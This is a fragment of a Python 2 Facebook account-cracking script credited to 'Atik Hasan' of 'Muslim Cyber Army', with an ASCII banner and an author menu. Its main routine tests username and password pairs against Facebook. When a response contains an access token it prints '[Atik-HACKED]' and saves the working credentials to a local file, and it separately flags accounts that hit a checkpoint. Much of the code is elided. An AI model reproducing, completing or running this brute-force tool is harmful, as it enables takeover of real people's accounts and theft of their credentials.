#Tools Created By Atik Hasan
#Muslim Cyber Army The Hacker 
...
print("""
 ...
 \033[0;94m     _   _ _      _    _                       
 \033[0;94m    /\  | | (_) |    | |  | |                      
 \033[0;96m  /  \ | |_ _| | __ | |__| | __ _ ___  __ _ _ __  
 \033[0;96m / /\ \| __| | |/ / |  __  |/ _` / __|/ _` | '_ \ 
 \033[0;96m/ ____ \ |_| |   <  | |  | | (_| \__ \ (_| | | | |
 \033[0;96m/_/    \_\__|_|_|\_\ |_|  |_|\__,_|___/\__,_|_| |_|
 
""")
 
print("\033[0;91mThis Tool's Free By Atik Hasan")
...
def menu():
    ...
    print logo
    print ''
    print '\033[0;93mAUTHOR   : Atik Hasan'
    print '\033[0;94mYOUTUBE : Muslim Cyber Army The '
    print '\033[0;96mGITHUB   : github.com/4a7t1k'
    print ''
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[Atik-HACKED]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[Atik Hasan-CP]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\x1b[1;92m \x1b[0m \n'
